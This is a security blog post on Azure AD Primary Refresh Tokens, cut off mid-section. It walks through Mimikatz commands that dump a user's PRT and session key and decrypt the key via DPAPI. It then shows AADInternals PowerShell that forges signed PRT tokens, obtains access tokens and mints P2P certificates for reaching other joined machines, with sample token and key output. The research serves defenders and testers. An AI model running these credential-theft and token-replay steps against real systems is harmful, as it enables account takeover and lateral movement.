<!DOCTYPE html>
<html lang="en-gb">
<head>
<meta charset="UTF-8">
<meta http-equiv="cache-control" content="no-cache"> 
<meta http-equiv="expires" content="0"> 
<meta http-equiv="pragma" content="no-cache">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert</title>
<meta name="description" content="The site for Microsoft 365 and Azure AD administrators">
<meta name="generator" content="Hugo 0.39" />
<meta property="og:title" content="Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert" />
<meta property="og:description" content="Lately we have seen great articles by @_dirkjan,
@tifkin_,
@rubin_mor,
 and @gentilkiwi
about utilising Primary Refresh Token (PRT) to get access to Azure AD and Azure AD joined computers.

In this blog, I&rsquo;ll report my own findings regarding to PRT and introduce the new functionality added to AADInternals v0.4.1.

" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://o365blog.com/post/prt/" />



<meta property="article:published_time" content="2020-09-01T00:00:00&#43;00:00"/>

<meta property="article:modified_time" content="2020-10-15T00:00:00&#43;00:00"/>











<link rel="dns-prefetch" href="//fonts.googleapis.com" />
<link rel="dns-prefetch" href="//fonts.gstatic.com" />

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
<script type="text/javascript" src="/js/scripts.js"></script>
<script type="text/javascript" src="/js/tools.js"></script>

<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/images/apple-touch-icon-57x57.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114.png" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72.png" />
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144.png" />
<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/images/apple-touch-icon-60x60.png" />
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/images/apple-touch-icon-120x120.png" />
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/images/apple-touch-icon-76x76.png" />
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/apple-touch-icon-152x152.png" />
<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
<meta name="application-name" content="&nbsp;"/>
<meta name="msapplication-TileColor" content="#FFFFFF" />
<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-61454000-4', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>

</head>
<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
	<div class="container container-outer">
		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
		
			<div class="container container-inner clearfix">
			
				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
				
					<a class="logo__link" href="/" title="Office 365 blog" rel="home">
						<img src="/images/favicon-96x96.png"><h1 class="logo__title">Office 365 blog</h1>
						<h2 class="logo__tagline">Everything about Microsoft 365 security</h2>
					</a>
				</div>
			</div>
			
<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<ul class="menu__list">
		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD &amp; M365 KILL CHAIN</a></li>
		<li class="menu__item "><a class="menu__link" href="/aadinternals/">AAD INTERNALS</a></li>
		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/powershell/">POWERSHELL</a></li>
		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
	</ul>
</nav>

		</header>
		<div class="wrapper clearfix">

<main class="main-content content" role="main" itemprop="mainContentOfPage">
	<article class="post">
		<header class="post__header clearfix">
			<h1 class="post__title">Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert</h1>
			<p class="post__meta meta">
				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
				<time class="post__meta-date" datetime="2020-09-01T00:00:00">September 01, 2020</time>
					<time class="post__meta-lastmod" datetime="2020-10-15T00:00:00"> (Last Modified: October 15, 2020)</time>
				<span class="post__meta-categories meta-categories">
					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
			</p>
			<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fprt%2f&text=Journey%20to%20Azure%20AD%20PRT%3a%20Getting%20access%20with%20pass-the-token%20and%20pass-the-cert&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fprt%2f&mini=true&title=Journey%20to%20Azure%20AD%20PRT%3a%20Getting%20access%20with%20pass-the-token%20and%20pass-the-cert&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
		</header>
		<div class="post__content clearfix">
			<figure class="post__thumbnail">
				<img src="/images/posts/PRT.png" alt="Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert">
			</figure>
				<nav id="TableOfContents">
<ul>
<li><a href="#what-is-prt">What is PRT</a></li>
<li><a href="#utilising-existing-prts">Utilising existing PRTs</a>
<ul>
<li><a href="#browsercore-exe">BrowserCore.exe</a></li>
<li><a href="#the-mimikatz-way">The Mimikatz way</a></li>
<li><a href="#how-to-create-a-prt-token">How to create a PRT token?</a></li>
</ul></li>
<li><a href="#creating-your-own-prt">Creating your own PRT</a></li>
<li><a href="#prt-and-mfa-claims">PRT and MFA claims</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#what-next">What next?</a></li>
<li><a href="#references">References</a></li>
</ul>
</nav>
			<p>Lately we have seen great articles by <a href="https://twitter.com/_dirkjan" target="_blank">@_dirkjan</a>,
<a href="https://twitter.com/tifkin%5F" target="_blank">@tifkin_</a>,
<a href="https://twitter.com/rubin_mor" target="_blank">@rubin_mor</a>,
 and <a href="https://twitter.com/gentilkiwi" target="_blank">@gentilkiwi</a>
about utilising Primary Refresh Token (PRT) to get access to Azure AD and Azure AD joined computers.</p>

<p>In this blog, I&rsquo;ll report my own findings regarding to PRT and introduce the new functionality added to <strong>AADInternals v0.4.1</strong>.</p>

<p></p>

<h1 id="what-is-prt">What is PRT</h1>

<p>According to Microsoft <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token" target="_blank">documentation</a>:</p>

<blockquote>
<p>A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, iOS, and Android devices. It is a JSON Web Token (JWT) specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices.</p>
</blockquote>

<p>To simplify, it is a token used to identify the user and device. The issued token is valid for 14 days.</p>

<p>So what can we do with the PRT? With the plain token, nothing. We also need a session key, which is issued at the same time than the PRT.</p>

<p>The (Windows 10) computer must be Azure AD joined (or hybrid joined) to be able to get the PRT. According to <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#how-is-a-prt-issued" target="_blank">documentation</a>,
during the registration the <strong>dsreg</strong> component on Windows 10 device creates two key pairs:</p>

<blockquote>
<ul>
<li>Device key (dkpub/dkpriv) <br></li>
<li>Transport key (tkpub/tkpriv)</li>
</ul>
</blockquote>

<p>The private keys are (preferably) stored to TPM. The <strong>device key</strong> is used to identify the device, whereas <strong>transport key</strong> is
used to decrypt the <strong>session key</strong>. The session key is used as the Proof-of-Possession (POP) key, and also protected by TPM.</p>

<h1 id="utilising-existing-prts">Utilising existing PRTs</h1>

<h2 id="browsercore-exe">BrowserCore.exe</h2>

<p>As all the keys well protected, how to use them? The easiest way is to let the Windows components do the work for you!</p>

<p>Both <a href="https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/" target="_blank">@_dirkjan</a> and <a href="https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30" target="_blank">@tifkin_</a>
showed how Microsoft Edge and Chrome (through the <a href="https://chrome.google.com/webstore/detail/windows-10-accounts/ppnbnpeolgkicgegkbkbjmhlideopiji?hl=en" target="_blank">extension</a>) uses <strong>BrowserCore.exe</strong> to
generate a signed PRT token.</p>

<p>The generated token can be used either as a cookie or http request header, both named as <strong>x-ms-RefreshTokenCredential</strong>.</p>

<p>In AADInternals, I&rsquo;m using @_dirkjan&rsquo;s approach to send the requests to stdin of BrowserCore.exe and read the results from stdout.
I&rsquo;ve added <strong>-PRTToken</strong> parameter to <strong>Get-AADIntAccessTokenFor&lt;service&gt;</strong> functions so you can pass the prt token to get the access token.</p>

<p><strong>Note!</strong> On some computers I&rsquo;ve tested, getting the token may fail every now and then.</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the PRToken</span>
<span class="nv">$prtToken</span> <span class="p">=</span> <span class="nb">Get-AADIntUserPRTToken</span>

<span class="c"># Get an access token for AAD Graph API and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-PRTToken</span> <span class="nv">$prtToken</span></code></pre></div>

<p>The nicest thing here is that if the PRT was issued with MFA, the resulting access token also has the MFA claim!</p>

<blockquote>
<p><strong>Update on Sep 29th 2020:</strong> <br>
It seems that PRT tokens must now include the <strong>request_nonce</strong>. If not, Azure AD sends a redirect with <strong>sso_nonce</strong> which
must be added to the PRT token. This means that without access to <strong>session key</strong>, PRT tokens can&rsquo;t be used anymore.</p>
</blockquote>

<h2 id="the-mimikatz-way">The Mimikatz way</h2>

<p>The Mimikatz release <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200807" target="_blank">2.2.0Azure Pass-the-PRT</a> has everything needed for extracting
the PRT and session key.</p>

<p><strong>Note!</strong> Below I&rsquo;m using a virtual machine without TPM. Mimikatz may behave differently on a computer with TPM.</p>

<p>First step is to launch the mimikatz and get the debug privilege:</p>

<pre><code>mimikatz # privilege::debug
Privilege ' 20' OK
</code></pre>

<p>Next we dump the CloudAP stuff:</p>

<pre><code>mimikatz # sekurlsa::cloudap
</code></pre>

<p>The output contains a lot of users, but we are interested here on those having <strong>AzureAD</strong> as their domain:</p>

<pre><code>Authentication Id : 0 ; 4482338 (00000000:00446522)
Session           : Interactive from 3
User Name         : TestUser
Domain            : AzureAD
Logon Server      : (null)
Logon Time        : 01/09/2020 9.47.35
SID               : S-1-12-1-xx-xx-xx-xx
        cloudap :
             Cachedir : 15aab9d31109bbf8a2d0741b09cd5c0a05840d1fe788d513ee97715be0a19e5f
             Key GUID : {63502e91-4f44-43e9-8dc4-870d275383c5}
             PRT      : {&quot;Version&quot;:3, &quot;UserInfo&quot;:{&quot;Version&quot;:2, &quot;UniqueId&quot;:&quot;651ff3d8-3c71-45e8-8a7a-7f382f655099&quot;, &quot;PrimarySid&quot;:&quot;S-1-12-1-1696592856-1172847729-947878538-2572182831&quot;, &quot;DisplayName&quot;:&quot;Diego Siciliani&quot;, &quot;FirstName&quot;:&quot;Diego&quot;, &quot;LastName&quot;:&quot;Siciliani&quot;, &quot;Identity&quot;:&quot;DiegoS@contoso.myo365.site&quot;, &quot;PasswordChangeUrl&quot;:&quot;https:\/\/portal.microsoftonline.com\/ChangePassword.aspx&quot;, &quot;PasswordExpiryTimeLow&quot;:3583418367, &quot;PasswordExpiryTimeHigh&quot;:2147483446, &quot;PublicInfoPublicKeyType&quot;:0, &quot;Flags&quot;:0}, &quot;Prt&quot;:&quot;MC5BQUFBeGt3RFJMN19mRVNvbms3SXhzaTc3b2M3cWpodG9...aG1ianRuMk83QmtJdkg0QXNVRXp6dWhQX3ZwZ2ZNLWppYw&quot;, &quot;PrtReceivedtime&quot;:1598942856, &quot;PrtExpirytime&quot;:1600152597, &quot;ProofOfPossesionKey&quot;:{&quot;Version&quot;:1, &quot;KeyType&quot;:&quot;ngc&quot;, &quot;KeyValue&quot;:&quot;AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6...a_uuJVo86iywLqs0yh0sHCsGKd0rgqWrrQGMEQSSeq9E0znadE&quot;}, &quot;SessionKeyImportTime&quot;:1598942856, &quot;TenantId&quot;:&quot;44034cc6-ffbe-447c-a89e-4ec8c6c8bbee&quot;, &quot;UserName&quot;:&quot;DiegoS@contoso.myo365.site&quot;, &quot;Subject&quot;:&quot;0F_C1Khd7aizs-9miof-mezPCbhvdR9kd7CCOUhGg3I&quot;, &quot;AuthorityUri&quot;:&quot;https:\/\/login.microsoftonline.com&quot;, &quot;DeviceId&quot;:&quot;0c36183d-f45b-4973-9047-71856c6c24b3&quot;, &quot;DeviceCertificateThumbprint&quot;:&quot;qyc+i5KH3DL9k5M3K9gmLGpYdsk=&quot;, &quot;EnterpriseSTSInfo&quot;:{&quot;Version&quot;:0, &quot;PRTSupported&quot;:0, &quot;WinHelloSupported&quot;:0, &quot;WinHelloKeyReceiptSupported&quot;:0}, &quot;IsRestricted&quot;:0, &quot;CredentialType&quot;:1, &quot;DsrInstance&quot;:0, &quot;AdfsPasswordChangeInfo&quot;:0, &quot;AccountType&quot;:1, &quot;IsDefaultPasswordChangeUri&quot;:0}
             DPAPI Key: 061a521d6d93dadea48b5...83c4cc08fc577859ec0d0224 (sha1: 2ad0cf83b8ee8ad4267adc1e4809ab9a8d25f812)
</code></pre>

<p>And if we prettify the PRT we can see the following information (<strong>Prt</strong> and <strong>KeyValue</strong> truncated):
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
	<span class="nt">&#34;UserInfo&#34;</span><span class="p">:</span> <span class="p">{</span>
		<span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
		<span class="nt">&#34;UniqueId&#34;</span><span class="p">:</span> <span class="s2">&#34;1e0c26b9-6c98-4a8b-90a9-517fec2e7aa2&#34;</span><span class="p">,</span>
		<span class="nt">&#34;PrimarySid&#34;</span><span class="p">:</span> <span class="s2">&#34;S-1-12-1-xx-xx-xx-xx&#34;</span><span class="p">,</span>
		<span class="nt">&#34;DisplayName&#34;</span><span class="p">:</span> <span class="s2">&#34;Test User&#34;</span><span class="p">,</span>
		<span class="nt">&#34;FirstName&#34;</span><span class="p">:</span> <span class="s2">&#34;Test&#34;</span><span class="p">,</span>
		<span class="nt">&#34;LastName&#34;</span><span class="p">:</span> <span class="s2">&#34;User&#34;</span><span class="p">,</span>
		<span class="nt">&#34;Identity&#34;</span><span class="p">:</span> <span class="s2">&#34;TestU@contoso.com&#34;</span><span class="p">,</span>
		<span class="nt">&#34;PasswordChangeUrl&#34;</span><span class="p">:</span> <span class="s2">&#34;https:\/\/portal.microsoftonline.com\/ChangePassword.aspx&#34;</span><span class="p">,</span>
		<span class="nt">&#34;PasswordExpiryTimeLow&#34;</span><span class="p">:</span> <span class="mi">3583418367</span><span class="p">,</span>
		<span class="nt">&#34;PasswordExpiryTimeHigh&#34;</span><span class="p">:</span> <span class="mi">2147483446</span><span class="p">,</span>
		<span class="nt">&#34;PublicInfoPublicKeyType&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
		<span class="nt">&#34;Flags&#34;</span><span class="p">:</span> <span class="mi">0</span>
	<span class="p">},</span>
	<span class="nt">&#34;Prt&#34;</span><span class="p">:</span> <span class="s2">&#34;MC5BQUFBeGt3RFJMN19mRVNvbms3SXhzaTc3b2M3cWpodG9...aG1ianRuMk83QmtJdkg0QXNVRXp6dWhQX3ZwZ2ZNLWppYw&#34;</span><span class="p">,</span>
	<span class="nt">&#34;PrtReceivedtime&#34;</span><span class="p">:</span> <span class="mi">1598942856</span><span class="p">,</span>
	<span class="nt">&#34;PrtExpirytime&#34;</span><span class="p">:</span> <span class="mi">1600152597</span><span class="p">,</span>
	<span class="nt">&#34;ProofOfPossesionKey&#34;</span><span class="p">:</span> <span class="p">{</span>
		<span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
		<span class="nt">&#34;KeyType&#34;</span><span class="p">:</span> <span class="s2">&#34;ngc&#34;</span><span class="p">,</span>
		<span class="nt">&#34;KeyValue&#34;</span><span class="p">:</span> <span class="s2">&#34;AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6...a_uuJVo86iywLqs0yh0sHCsGKd0rgqWrrQGMEQSSeq9E0znadE&#34;</span>
	<span class="p">},</span>
	<span class="nt">&#34;SessionKeyImportTime&#34;</span><span class="p">:</span> <span class="mi">1598942856</span><span class="p">,</span>
	<span class="nt">&#34;TenantId&#34;</span><span class="p">:</span> <span class="s2">&#34;1f4b89e3-17eb-409e-864b-ff7ddd0fc4a0&#34;</span><span class="p">,</span>
	<span class="nt">&#34;UserName&#34;</span><span class="p">:</span> <span class="s2">&#34;TestU@contoso.com&#34;</span><span class="p">,</span>
	<span class="nt">&#34;Subject&#34;</span><span class="p">:</span> <span class="s2">&#34;0F_C1Khd7aizs-9miof-mezPCbhvdR9kd7CCOUhGg3I&#34;</span><span class="p">,</span>
	<span class="nt">&#34;AuthorityUri&#34;</span><span class="p">:</span> <span class="s2">&#34;https:\/\/login.microsoftonline.com&#34;</span><span class="p">,</span>
	<span class="nt">&#34;DeviceId&#34;</span><span class="p">:</span> <span class="s2">&#34;03bbfd6f-0109-428b-93de-e2359a8c3f84&#34;</span><span class="p">,</span>
	<span class="nt">&#34;DeviceCertificateThumbprint&#34;</span><span class="p">:</span> <span class="s2">&#34;qyc+i5KH3DL9k5M3K9gmLGpYdsk=&#34;</span><span class="p">,</span>
	<span class="nt">&#34;EnterpriseSTSInfo&#34;</span><span class="p">:</span> <span class="p">{</span>
		<span class="nt">&#34;Version&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
		<span class="nt">&#34;PRTSupported&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
		<span class="nt">&#34;WinHelloSupported&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
		<span class="nt">&#34;WinHelloKeyReceiptSupported&#34;</span><span class="p">:</span> <span class="mi">0</span>
	<span class="p">},</span>
	<span class="nt">&#34;IsRestricted&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
	<span class="nt">&#34;CredentialType&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
	<span class="nt">&#34;DsrInstance&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
	<span class="nt">&#34;AdfsPasswordChangeInfo&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
	<span class="nt">&#34;AccountType&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
	<span class="nt">&#34;IsDefaultPasswordChangeUri&#34;</span><span class="p">:</span> <span class="mi">0</span>
<span class="p">}</span></code></pre></div></p>

<p>Next, we need to decode the <strong>KeyValue</strong> from <strong>ProofOfPossesionKey</strong> (MS typo :thinking:?) to get the session key. We continue by elevating to NT AUTHORITY\SYSTEM:</p>

<pre><code>mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM
</code></pre>

<p>Now we can use Mimikatz to unprotect the session key:</p>

<pre><code>mimikatz # dpapi::cloudapkd /keyvalue:AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6...a_uuJVo86iywLqs0yh0sHCsGKd0rgqWrrQGMEQSSeq9E0znadE /unprotect
Label      : AzureAD-SecureConversation
Context    : b10e7c099040ebb7a15a6cab38ad320a8ef8c68c73c299bf
 * using CryptUnprotectData API
Key type   : Software (DPAPI)
Clear key  : e5268ef434fb624db4b133cf9f0854d73d367284b0f39543810587afd5d4178d
Derived Key: ddd22d1244a43095a866b666ef9f0cab9c8d7bb364256548a6e603466d800604
</code></pre>

<p>As we have both the <strong>PRT</strong> and the <strong>session key</strong> (<strong>Clear key</strong> from the output above) and we can generate a new PRT token using AADInternals:</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Add the PRT to a variable</span>
<span class="nv">$MimikatzPRT</span> <span class="p">=</span> <span class="s2">&#34;MC5BQUFBeGt3RFJMN19mRVNvbms3SXhzaTc3b2M3cWpodG9...aG1ianRuMk83QmtJdkg0QXNVRXp6dWhQX3ZwZ2ZNLWppYw&#34;</span>

<span class="c"># Add padding</span>
<span class="k">while</span><span class="p">(</span><span class="nv">$MimikatzPRT</span><span class="p">.</span><span class="n">Length</span> <span class="p">%</span> <span class="n">4</span><span class="p">)</span> <span class="p">{</span><span class="nv">$MimikatzPRT</span> <span class="p">+=</span> <span class="s2">&#34;=&#34;</span><span class="p">}</span>

<span class="c"># Convert from Base 64</span>
<span class="nv">$PRT</span> <span class="p">=</span> <span class="no">[text.encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$MimikatzPRT</span><span class="p">))</span>

<span class="c"># Add the session key (Clear key) to a variable</span>
<span class="nv">$MimikatzKey</span> <span class="p">=</span> <span class="s2">&#34;e5268ef434fb624db4b133cf9f0854d73d367284b0f39543810587afd5d4178d&#34;</span>

<span class="c"># Convert to byte array and base 64 encode</span>
<span class="nv">$SKey</span> <span class="p">=</span> <span class="no">[convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span> <span class="no">[byte[]]</span> <span class="p">(</span><span class="nv">$MimikatzKey</span> <span class="o">-replace</span> <span class="s1">&#39;..&#39;</span><span class="p">,</span> <span class="s1">&#39;0x$&amp;,&#39;</span> <span class="n">-split</span> <span class="s1">&#39;,&#39;</span> <span class="o">-ne</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>

<span class="c"># Generate a new PRTToken with nonce</span>
<span class="nv">$prtToken</span> <span class="p">=</span> <span class="nb">New-AADIntUserPRTToken</span> <span class="n">-RefreshToken</span> <span class="nv">$PRT</span> <span class="n">-SessionKey</span> <span class="nv">$SKey</span> <span class="n">-GetNonce</span>

<span class="c"># Get an access token for AAD Graph API and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-PRTToken</span> <span class="nv">$prtToken</span> <span class="n">-SaveToCache</span></code></pre></div>

<p>At some point in September 2020 Microsoft changed (fixed?) the authentication flow of PRTTokens to require a nonce.</p>

<p>With the session key and PRT, the new PRT tokens can be created as long as the PRT is valid.</p>

<p>As <a href="https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597" target="_blank">@rubin_mor</a> demonstrated,
we can also use the session key and PRT to get a <strong>Azure AD P2P certficate</strong>. The certificate, in turn,
can be used to get access to other computers joined to the same Azure AD tenant.</p>

<p>Continuing the previous example, we can get the certificate with AADInternals:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Generate a new P2P certificate</span>
<span class="nb">New-AADIntP2PDeviceCertificate</span> <span class="n">-RefreshToken</span> <span class="nv">$PRT</span> <span class="n">-SessionKey</span> <span class="nv">$SKey</span></code></pre></div>
Output:</p>

<pre><code>User certificate successfully created:
  Subject:         &quot;CN=TestU@contoso.com, CN=S-1-12-1-xx-xx-xx-xx, DC=0f73eaa6-7fd6-48b8-8897-e382ba96daf4&quot;
  Issuer:          &quot;CN=MS-Organization-P2P-Access [2020]&quot;
  Cert thumbprint: A7F1D1F134569E0234E6AA722354D99C3AA68D0F
  Cert file name : &quot;TestU@contoso.com-P2P.pfx&quot;
  CA file name :   &quot;TestU@contoso.com-P2P-CA.der&quot;
</code></pre>

<p>The generated certificate can be used with <a href="https://github.com/morRubin/AzureADJoinedMachinePTC" target="_blank">AzureADJoinedMachine</a> by @rubin_mor
to access other Azure AD joined machines.</p>

<h2 id="how-to-create-a-prt-token">How to create a PRT token?</h2>

<p>It was quite easy to dump required information using Mimikatz.
But how is the PRT token actually created? The answer is by creating a JWT and signing it with a key that is derived from <strong>context</strong> and <strong>session key</strong>.</p>

<p>The <strong>context</strong> is a Base 64 encoded random byte array (24 bytes) and it is added to the JWT header:
<strong>Note!</strong> All slashes &lsquo;/&rsquo; must be escaped with back slashes &lsquo;\&rsquo;
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span><span class="p">,</span>
	<span class="nt">&#34;typ&#34;</span><span class="p">:</span> <span class="s2">&#34;JWT&#34;</span><span class="p">,</span>
	<span class="nt">&#34;ctx&#34;</span><span class="p">:</span> <span class="s2">&#34;x9XSurmy8TmcsJUgxq\/IT5TJg73fgiKj&#34;</span>
<span class="p">}</span></code></pre></div></p>

<p>The body of the JWT contains the <strong>is_primary</strong> (always true), <strong>iat</strong> (unix time = seconds since 1.1.1970) and <strong>refresh_token</strong> (PRT).
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
	<span class="nt">&#34;is_primary&#34;</span><span class="p">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
	<span class="nt">&#34;iat&#34;</span><span class="p">:</span> <span class="mi">1598958425</span><span class="p">,</span>
	<span class="nt">&#34;refresh_token&#34;</span><span class="p">:</span> <span class="s2">&#34;0.AAAAxkwDRL7_fESonk7Ixsi77oc7qjhtoBdIsnV6MWmI2TtfAM8.AgABAAAAAAAGV_bv21oQQ4ROqh0_1-tAAQDs_wIA9P-ojLeOCNV0dCFvHzSo64nTRhq19kM_getBIkw-QN87pYh7_AnHZirEP1K55AoxUaTHJdtttzb4xJuf_yG30jr5z034xffcW4e_EXuAfQJ6fR9FFi2-YslwAKSUAlLagdQMXLzyv5x_FcVpdvcUq3NgbmUTY9WaNSwiswoTC_aD9N1vV3_EPEQ7VSXpLOzzTc1QnlQtI0IwtUdyLdHckjVu6fphMYMXB82f472D684rfYczD7mp-hyYRZS3AQNtPsit1t9poiZ6_T5ExKDt55_5XQ6rRvXmAG3cfm362LB8wmADQdMNnczyUZlyFJbYV952cLL71a3bkB7w9avy1N_WHEAm5p-5GpXI0RdXppllFznBzH0B7iN6e1XSb_WLWCCGy9jLNTEtYr_vhK4XVnyWY0KPOmu7aATkotNnWOIQUt8gPZrMM8Q8TDF7XISrt90NFlo2FADs77yaqhvhwAaQH5we8YNC4fJ9AQX0wz7f4zjc-bLoZRSvuKwC4uG1mRs8cCoEncsMlSQWIBfI50q7kKife-k95dXlRqmtEVdIqZCJVBO4xwFYWUgRBzU2FVGurYxFwVVjvPHoKRBJ4l9bcvtSw4eb0MuovLmTVa5vLrlZd-cPi3sj-ESDA-LtJi_W71vPCnXsmk8Iw4u6w-GmmIFq1l1mn9wizHIFDLCKKqQuqVjo0cB-PQ9kcSyWXNwOlGF_prK6Og8EpNkjzMBrczKpFIVr6t7yxmSPc-JFeMSK2vPxtun2vng035O226b7LvbfpKgezfENXjBHvBP10qbXi1o0WWpf7P_gxZH9h4roFM0qyxt5Y8dqiCOb2NnJeEDJ_yuK54a2TdA6LsLuxdssW1lUkXUTtwkT0vKnZ0SRJtieujiCZ-Vj-E2469NgQn7qEAeYtS9zRbL3PVS5iw4o2kJenXQJNxMbxfmZh1rcGwxIyhltmQuoGUMF6gXGxKXSPJH6goSz1Wej0mQSMgdh7GneK50Npaeg6FZHZhxHpxtzEkWQRYSNZoNUOlo5Zv_3dZhB9LDvsFrnfr34IPeElFO6m0u3vGD8hY3RMkwO7oeRy9ufvnAcZ1kaP0QM7LmSglq_1cX_rhFlft7TVBYMcAOzoxr076ZU04IS3ON88dljGYUX2BF2a4TyZTyfjMT3diAuufJW_99ITDQ6QvkzZklaGWlsEdysa_oQ85OXPuBkVcBgzTsr_urKXN1j6L1U&#34;</span>
<span class="p">}</span></code></pre></div></p>

